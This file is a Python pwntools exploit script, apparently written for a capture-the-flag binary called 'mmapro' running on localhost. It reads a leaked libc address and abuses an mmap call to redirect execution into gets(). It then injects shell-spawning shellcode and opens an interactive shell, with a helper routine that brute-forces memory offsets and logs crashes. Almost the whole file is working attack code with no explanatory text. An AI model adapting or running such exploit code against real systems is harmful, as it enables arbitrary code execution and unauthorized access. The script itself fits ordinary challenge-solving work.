#!/usr/bin/env python3

from pwn import *

exe = ELF("./mmapro_patched")
libc = ELF("./libc.so.6")

serv = "localhost"
port = 5000

context.binary = exe
#context.aslr = False

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                libc
                #b *main+144
                #b *main+242
                #b *___pthread_mutex_lock+0x1d
                #b _IO_file_sync
                #b *0x0000155555295c0b
                #source ./bp.py
                #b *0x1555552acfff
                #b *0x1555552b600c
                #b *main+0x11c
                #b *__run_exit_handlers+0x25f
                #b *_IO_flush_all+0x3e
                #b *main+216
                #b *mmap64+42
                #c
                #b *__run_exit_handlers+0x164
                b *$libc+0x24a72
                b *$libc+0xde1c2
            """)
    return r

r = conn()

def test():
    global r
    if args.GDB:
        exit()
    f = open("log", "w")
    for i in range(0x178):
        libc.address = u64(r.recv(8))-0x115f20
        log.info(f"{hex(libc.address)=}")
        mmap(libc.address+0x22000+i*0x1000, 0x1000, 0xcafeabedeadbeef7, 0xcafebabe00000032, 0xcafedeadbeef, 0xcafedead1000)
        try:
            r.recv(timeout=1)
        except:
            signal = r.poll()
            if signal != 0:
                f.write(f"signal {signal} at iteration {i}\n")
            r.close()
        r = conn()
    exit()

def mmap(a, b, c, d, e, f):
    r.send(p64(a)+p64(b)+p64(c)+p64(d)+p64(e)+p64(f))

def main():
    global r
    for i in range(0x10):
        log.info(f"{i}")
        libc.address = u64(r.recv(8))-0x115f20
        log.info(f"{hex(libc.address)=}")
        mask = 0xffffffffffebfff2
        r14 = libc.address+0xe1a1e
        flags = libc.address+0xbda72
        if (flags & ~mask) != 0:
            print("unlucky with mask")
            r.close()
            r = conn()
            continue
        mmap(libc.address+0x115000, 0x57000, r14, flags, libc.sym.gets, libc.address+0x115000)
        sleep(0.2)
        r.sendline(asm(shellcraft.sh()))
        r.interactive()
        exit()


if __name__ == "__main__":
    main()
